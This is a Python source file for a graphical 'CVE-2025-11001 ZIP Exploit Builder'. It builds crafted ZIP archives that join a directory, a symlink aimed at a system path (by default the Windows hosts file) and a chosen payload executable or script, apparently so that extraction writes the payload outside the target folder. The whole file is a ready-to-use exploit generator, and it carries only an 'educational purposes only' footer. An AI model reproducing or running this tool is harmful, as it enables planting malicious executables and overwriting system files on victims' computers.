import tkinter as tk
from tkinter import filedialog, messagebox, ttk
import argparse
import os
import time
import zipfile
import threading
import sys

# === Exploit Functions (unchanged, just wrapped) ===
def add_dir(z, arcname):
    if not arcname.endswith('/'):
        arcname += '/'
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o040755 << 16) | 0x10
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, b'')

def add_symlink(z, arcname, target):
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o120777 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, target.encode('utf-8'))

def add_file_from_disk(z, arcname, src_path):
    with open(src_path, 'rb') as f:
        payload = f.read()
    zi = zipfile.ZipInfo(arcname)
    zi.date_time = time.localtime(time.time())[:6]
    zi.create_system = 3
    zi.external_attr = (0o100644 << 16)
    zi.compress_type = zipfile.ZIP_STORED
    z.writestr(zi, payload)

def create_exploit_zip(zip_out, symlink_target, data_file, dir_name, link_name):
    top_dir = dir_name.rstrip("/")
    link_entry = f"{top_dir}/{link_name}"
    embedded_name = os.path.basename(data_file)
    file_entry = f"{link_entry}/{embedded_name}"

    with zipfile.ZipFile(zip_out, "w") as z:
        add_dir(z, top_dir)
        add_symlink(z, link_entry, symlink_target)
        add_file_from_disk(z, file_entry, data_file)

# === GUI Application ===
class ExploitZipGUI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CVE-2025-11001 ZIP Exploit Builder")
        self.geometry("700x500")
        self.resizable(False, False)
        self.configure(bg="#1e1e1e")

        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("TLabel", background="#1e1e1e", foreground="#ffffff", font=("Segoe UI", 10))
        style.configure("TButton", font=("Segoe UI", 10, "bold"), padding=6)
        style.map("TButton", background=[('active', '#555555')], foreground=[('active', '#ffffff')])
        style.configure("Success.TLabel", foreground="#00ff00")
        style.configure("Error.TLabel", foreground="#ff4444")

        # Variables
        self.zip_out = tk.StringVar()
        self.symlink_target = tk.StringVar(value="C:\\Windows\\System32\\drivers\\etc\\hosts")
        self.data_file = tk.StringVar()
        self.dir_name = tk.StringVar(value="data")
        self.link_name = tk.StringVar(value="link_in")

        self.create_widgets()
        self.center_window()

    def center_window(self):
        self.update_idletasks()
        x = (self.winfo_screenwidth() // 2) - (700 // 2)
        y = (self.winfo_screenheight() // 2) - (500 // 2)
        self.geometry(f"700x500+{x}+{y}")

    def create_widgets(self):
        # Header
        header = tk.Label(self, text="CVE-2025-11001 ZIP Exploit Generator", 
                         font=("Segoe UI", 16, "bold"), bg="#1e1e1e", fg="#00aaff")
        header.pack(pady=15)

        # Main frame
        main_frame = tk.Frame(self, bg="#1e1e1e")
        main_frame.pack(padx=30, pady=10, fill="both", expand=True)

        # Output ZIP
        self.add_field(main_frame, "Output ZIP File:", 0, self.zip_out, button_text="Browse...", 
                      command=self.browse_zip)

        # Symlink Target
        self.add_field(main_frame, "Symlink Target (e.g., C:\\path):", 1, self.symlink_target)

        # Data File
        self.add_field(main_frame, "Payload File (exe, bat, etc.):", 2, self.data_file, 
                      button_text="Browse...", command=self.browse_file)

        # Directory Name
        self.add_field(main_frame, "Top-Level Dir Name:", 3, self.dir_name)

        # Link Name
        self.add_field(main_frame, "Symlink Name:", 4, self.link_name)

        # Generate Button
        generate_btn = ttk.Button(main_frame, text="GENERATE EXPLOIT ZIP", 
                                 command=self.start_generation, style="TButton")
        generate_btn.grid(row=5, column=0, columnspan=3, pady=25, sticky="ew")
        main_frame.grid_columnconfigure(1, weight=1)

        # Status
        self.status_label = tk.Label(main_frame, text="Ready.", bg="#1e1e1e", fg="#aaaaaa", 
                                    font=("Consolas", 10))
        self.status_label.grid(row=6, column=0, columnspan=3, pady=10, sticky="w")

        # Progress Bar
        self.progress = ttk.Progressbar(main_frame, mode='indeterminate')
        self.progress.grid(row=7, column=0, columnspan=3, sticky="ew", pady=10)

        # Footer
        footer = tk.Label(self, text="Use responsibly â€¢ Educational purposes only", 
                         bg="#1e1e1e", fg="#666666", font=("Segoe UI", 8))
        footer.pack(side="bottom", pady=10)

    def add_field(self, parent, label, row, var, button_text=None, command=None):
        ttk.Label(parent, text=label).grid(row=row, column=0, sticky="w", pady=8, padx=(0, 10))
        
        entry = tk.Entry(parent, textvariable=var, width=50, bg="#2d2d2d", fg="#ffffff", 
                        insertbackground="#ffffff", relief="flat", font=("Consolas", 10))
        entry.grid(row=row, column=1, sticky="ew", pady=8, padx=(0, 10))

        if button_text and command:
            btn = ttk.Button(parent, text=button_text, command=command)
            btn.grid(row=row, column=2, padx=(5, 0), pady=8)

    def browse_zip(self):
        path = filedialog.asksaveasfilename(
            defaultextension=".zip",
            filetypes=[("ZIP files", "*.zip"), ("All files", "*.*")],
            title="Save Exploit ZIP As"
        )
        if path:
            self.zip_out.set(path)

    def browse_file(self):
        path = filedialog.askopenfilename(
            filetypes=[("Executables", "*.exe *.bat *.ps1"), ("All files", "*.*")],
            title="Select Payload File"
        )
        if path:
            self.data_file.set(path)

    def start_generation(self):
        if not all([self.zip_out.get(), self.symlink_target.get(), self.data_file.get()]):
            messagebox.showerror("Missing Fields", "Please fill in all required fields.")
            return

        if not os.path.isfile(self.data_file.get()):
            messagebox.showerror("Invalid File", "Payload file does not exist.")
            return

        self.status_label.config(text="Generating...", style="TLabel")
        self.progress.start(10)
        self.generate_btn = self.winfo_children()[0].winfo_children()[0].winfo_children()[-3]
        self.generate_btn.config(state="disabled")

        thread = threading.Thread(target=self.generate_zip, daemon=True)
        thread.start()

    def generate_zip(self):
        try:
            create_exploit_zip(
                zip_out=self.zip_out.get(),
                symlink_target=self.symlink_target.get(),
                data_file=self.data_file.get(),
                dir_name=self.dir_name.get(),
                link_name=self.link_name.get()
            )
            self.after(0, self.on_success)
        except Exception as e:
            self.after(0, lambda: self.on_error(str(e)))

    def on_success(self):
        self.progress.stop()
        self.status_label.config(text=f"Exploit ZIP saved: {self.zip_out.get()}", style="Success.TLabel")
        self.generate_btn.config(state="normal")
        messagebox.showinfo("Success", f"Exploit ZIP created successfully!\n\nSaved to:\n{self.zip_out.get()}")

    def on_error(self, error):
        self.progress.stop()
        self.status_label.config(text=f"Error: {error}", style="Error.TLabel")
        self.generate_btn.config(state="normal")
        messagebox.showerror("Generation Failed", f"An error occurred:\n\n{error}")

# === Entry Point ===
if __name__ == "__main__":
    # Hide console on Windows if frozen
    if getattr(sys, 'frozen', False):
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    app = ExploitZipGUI()
    app.mainloop()
